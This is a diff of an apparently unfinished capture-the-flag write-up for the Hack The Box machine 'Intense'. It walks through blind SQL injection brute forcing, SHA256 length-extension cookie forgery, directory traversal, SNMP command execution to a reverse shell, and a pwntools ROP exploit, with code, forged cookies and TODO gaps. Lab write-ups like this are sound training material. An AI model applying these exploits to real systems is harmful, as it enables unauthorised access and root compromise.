@@ -1,6 +1,6 @@
 # HTB - Intense
 
-## Overview
+## Overview - TODO: finish cleaning up notes
 
 ![](../../.gitbook/assets/0-intense-infocard.png)
 
@@ -81,7 +81,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds
 ```
 
-My nmap scan showed that only ports 22 and 80 were open. 
+My nmap scan showed that only ports 22 - SSH and 80 - HTTP were open. 
+
+### Port 80 - HTTP
 
 ![](../../.gitbook/assets/1-port80.png)
 
@@ -108,6 +110,8 @@ On the `/submit` page I found an input box, and of course I had to see what kind
 ![](../../.gitbook/assets/4-syntax-error.png)
 
 While testing for XSS, I found that the input box seemed to hint at SQL injection vulnerability since it seemed to have problems with me using single quotes.  After testing this for a short time I decided to look into the code from the `src.zip` I downloaded from the main page to find out what kind of queries I might need to formulate.
+
+### Source Code Review
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -502,11 +506,13 @@ To test my theory I used Burp's Intruder to test a brute force of all alpha-nume
 
 ![](../../.gitbook/assets/8-intruder-test%20%281%29.png)
 
-tests
+I set Intruder to only fuzz the single character at a time in my query.
 
 ![](../../.gitbook/assets/8-intruder-first-f.png)
 
-I was successful, and found that the first character in the admin's secret was `'f'`. 
+After letting the fuzzer run, I found that the first character in the admin's secret was `'f'`.  This was the only request that received an HTTP 200 OK message.
+
+### Using python to brute force
 
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -514,9 +520,7 @@ I was successful, and found that the first character in the admin's secret was `
 64
 ```
 
-### Using python to brute force
-
-I used the cookie I already had to pull out the secret string `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec` which was 64 characters long.  This let me know how many characters I needed to brute force for the admin secret. From this I used python to write a brute force program to iterate through all 64 characters in the secret. The following sources helped me:
+I used the cookie I already had to pull out the secret string `84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec` which was 64 characters long.  This let me know how many characters I needed to brute force for the admin secret. From this I used Python to write a brute force program to iterate through all 64 characters in the secret. The following sources helped me:
 
 * To get all alpha-numeric chars: [https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters](https://stackoverflow.com/questions/5891453/is-there-a-python-library-that-contains-a-list-of-all-the-ascii-characters)
 * To print output dynamically on one line: [https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically](https://stackoverflow.com/questions/3249524/print-in-one-line-dynamically)
@@ -556,7 +560,7 @@ print("Total runtime: ")
 print("--- %s seconds ---" % (time.time() - start_time))
 ```
 
-My finalized python script
+My finalized python script was fairly short, and mostly consisted of creating a request with the SQL injection query in it.  I then iterated over all printable ASCII characters for each of the 64 positions in the secret.  I also added a little timer to see how long it would take to brute force the whole secret.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -567,7 +571,7 @@ Total runtime:
 --- 48.5825309753418 seconds ---
 ```
 
-the whole brute force went pretty quick! I added a timer to test it, and it took less than 50 seconds to go through the whole string
+The whole brute force went pretty quickly!  From the timer I found that it took less than 50 seconds to go through the whole string.
 
 ```text
 auth=username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;ÉBCJ±ØèÅÞ
@@ -575,7 +579,7 @@ b¾nTÁu µí§
 sm`Æ
 ```
 
-crafted my new auth cookie, then base64'd it, and got the result: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
+Next I crafted my new `auth` cookie, `base64`'d it, and got the result: `dXNlcm5hbWU9YWRtaW47c2VjcmV0PWYxZmMxMjAxMGMwOTQwMTZkZWY3OTFlMTQzNWRkZmRjYWVjY2Y4MjUwZTM2NjMwYzBiYzkzMjg1YzI5NzExMDU7yUJDSrHY6MXeDWIMvm6WVBrBiI11ILXthKcNc22KYMY=`
 
 ![](../../.gitbook/assets/9-broke-site.png)
 
@@ -615,7 +619,7 @@ def parse_session(cookie):
     return info
 ```
 
-I went back to the source code file `lwt.py` , which gave me the answer.  The data after the `;` was a signature created by running sha256 on secret + MSG
+I went back to the source code file `lwt.py` , which gave me the answer.  The data after the `;` was a signature created by running `sha256` on `secret + MSG`.
 
 ```python
 def create_cookie(session):
@@ -627,6 +631,8 @@ In order to create the signature, I needed to run the `create_cookie()` method a
 
 [https://github.com/bwall/HashPump](https://github.com/bwall/HashPump)
 
+TODO: find out what happened to this script on import...should be below
+
 ```python
 
 ```
@@ -637,7 +643,7 @@ implementing hashpumpy...
 dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQO3VzZXJuYW1lPWFkbWluO3NlY3JldD1mMWZjMTIwMTBjMDk0MDE2ZGVmNzkxZTE0MzVkZGZkY2FlY2NmODI1MGUzNjYzMGMwYmM5MzI4NWMyOTcxMTA1Ow==.IZp1w+kV4OqLepjmgjxZR6/bcZXtV138PqZiZdxNoGg=
 ```
 
-the final admin cookie was
+The final admin cookie was:
 
 ```text
 Cookie: auth=username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;.!uÃéàêzæ<YG¯ÛqíW]ü>¦beÜM h
@@ -647,39 +653,58 @@ For some reason the `hashpumpy` module added the guest cookie to the admin cooki
 
 ![](../../.gitbook/assets/9-welcomeadmin.png)
 
-However this mega-cookie worked and I was able to login to the `/admin` page successfully.  Back in the `admin.py` file it mentioned using the `logfile` and `logdir` properties on their respective directories, along with the POST method after logging in as admin.  This looked like a task for Burp Repeater.
+However this mega-cookie worked and I was able to login to the `/admin` page successfully.  
+
+## Initial Foothold
+
+### Remote Code Execution \(Limited\)
+
+Back in the `admin.py` file it mentioned using the `logfile` and `logdir` properties on their respective directories, along with the POST method after logging in as admin.  This looked like a task for Burp Repeater.
 
 ![](../../.gitbook/assets/10-etcpasswd.png)
 
-The `logfile` property was suceptable to directory traversal, and through Burp I was able to download `/etc/passwd`.  There were only two users that had the ability to login: `root` and `user`. I noticed an unusual user named `debian_snmp`, so I decided to see what I could find using the SNMP service. \(Another nmap scan revealed that UDP port 161 was open, which is the default SNMP port!\)
+The `logfile` property was susceptible to directory traversal, and through Burp I was able to download `/etc/passwd`.  There were only two users that had the ability to login: `root` and `user`. I noticed an unusual user named `debian_snmp`, so I decided to see what I could find using the SNMP service. \(Another nmap scan revealed that UDP port 161 was open, which is the default SNMP port!\)
 
 ![](../../.gitbook/assets/10-snmpd-conf.png)
 
-snmpd.conf - found Read/Write community string for SNMP of `SuP3RPrivCom90`
+While looking at the SNMP configuration files, I found a read/write community string of `SuP3RPrivCom90` in `snmpd.conf`.
 
 ![](../../.gitbook/assets/10-ssh-conf.png)
 
 ssh.conf - nothing useful
 
-![](../../.gitbook/assets/10-success-ornot.png)
-
-dh
-
 ![](../../.gitbook/assets/10-user-folder.png)
 
-sgs
+I also used the logdir property to enumerate the contents of `/home/user`.  This folder contained the file `user.txt`, so I knew I was on the right track.
 
-![](../../.gitbook/assets/10-user-ssh.png)
-
-atga
+### User.txt
 
 ![](../../.gitbook/assets/10-user-txt.png)
 
 This was interesting...it isn't very often that I am able to get the user flag through web requests.
 
-## Initial Foothold
+![](../../.gitbook/assets/10-user-ssh.png)
 
+I also checked for the presence of the `authorized_keys` file, since this is a great way to gain persistence.
 
+### Enumerating SNMP
+
+Next, I spend some time trying to find information on how to use that community string I had found to gain access to the machine.  I found a nice blog that showed me exactly what I needed to do to get a shell through SNMP.
+
+* [https://digi.ninja/blog/snmp\_to\_shell.php](https://digi.ninja/blog/snmp_to_shell.php)
+
+```text
+snmpwalk:
+
+snmpwalk -v 2c -c <community-string> host-with-snmpd.lan
+
+Set SNMP tools to show OID human readable names instead of numbers:
+
+apt-get install snmp-mibs-downloader download-mibs
+echo "" > /etc/snmp/snmp.conf
+```
+
+installed snmp MIBs
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -712,21 +737,6 @@ SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing IP and ICMP imple
 SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing UDP implementations
 SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
 SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
-```
-
-[https://digi.ninja/blog/snmp\_to\_shell.php](https://digi.ninja/blog/snmp_to_shell.php)
-
-installed snmp MIBs
-
-```text
-snmpwalk:
-
-snmpwalk -v 2c -c <community-string> host-with-snmpd.lan
-
-Set SNMP tools to show OID human readable names instead of numbers:
-
-apt-get install snmp-mibs-downloader download-mibs
-echo "" > /etc/snmp/snmp.conf
 ```
 
 Not much information gained from SNMP walk
@@ -781,9 +791,9 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 ```
 
-Unfortunately the isntalled version of nc did not have `-e` functionality
+Unfortunately the version of `nc` on the victim's computer did not have `-e` functionality, so I wasn't able to get it to send me a reverse shell.
 
-## Road to User
+## Getting a shell
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/intense]
@@ -839,13 +849,11 @@ intense
 
 got a shell back on my waiting nc listener
 
-a strange problem I encountered with this snmp terminal...if I lost my shell I would lose the ability to connect back to this box. Not sure why or how, but it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\).  After it happened again later I reset the machine itself and this fixed it...
+{% hint style="info" %}
+There was a strange problem I encountered with this SNMP shell...if I lost my shell I would lose the ability to connect back to this box. Not sure why or how, but it took two resets of my connection pack and my local machine to get it to work again. I thought I had lost all connection to HTB, but after it happened again a few days later I tried pinging a known active box \(I think I had accidentally tried pinging a box that is inactive, leading me to believe I lost my whole connection\).  After it happened again later I reset the machine itself and this fixed it...
+{% endhint %}
 
-### Further enumeration
 
-### Finding user creds
-
-### User.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -908,7 +916,11 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
 Downloaded a few interesting files from `user`'s home folder...then lost my shell again when I cancelled the http server \(right after I realized I should have put my ssh key there!\)
 
+TODO: Where is the note\_server.c code?
 
+```text
+
+```
 
 Analysis of the note\_server.c code showed me that the program was looking for a connection to `127.0.0.1` on port 5001.  
 
@@ -964,9 +976,7 @@ I was successful in copying my key, but I wasn't able to login and get a shell. 
 └─$ ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense.key
 ```
 
-I was able to use SSH to create a tunnel to the machine without running any commands in case I needed to connect to anything from my machine
-
-### Getting a shell
+Even though I couldn't login, I was still able to use SSH to create a tunnel to the machine without running any commands.  This came in handy later when I wanted to connect to a port that was only open on the local host.
 
 ```text
 Debian-snmp@intense:/home/user$ ps -u root
@@ -997,7 +1007,11 @@ ps -u root
 
 note-server was running as root
 
+## Binary Exploitation
+
+{% hint style="info" %}
 note: had to get help with this, not good with binary exploitation - thank you to ippsec for his amazing walkthrough videos; also the official write-up for the final working script. For some reason I wasnt able to get gdb's breakpoints to work. It kept giving me an error when running after setting a break point on the write@plt address
+{% endhint %}
 
 ```text
 0x0000000000000d27 <+541>:   callq  0x900 <write@plt>
@@ -1028,6 +1042,8 @@ kept getting errors when trying to set break points in gdb. I got frustrated wit
 Got address of /xf54
 
 I did learn something very useful for the future - compiling with `-ggdb` will compile with source code intact - very useful for analysis and debugging
+
+Wrote a few different Python scripts trying to exploit this, but in the end I needed to look at the official writeup to find out what I had been doing wrong.
 
 ```python
 from pwn import *
@@ -1099,7 +1115,7 @@ doRop(rop)
 p.interactive()
 ```
 
-Copied and cleaned up the code from the official writeup, then ran it
+Copied and cleaned up the code from the official writeup, then ran it TODO: explain what it does
 
 ### Root.txt
 
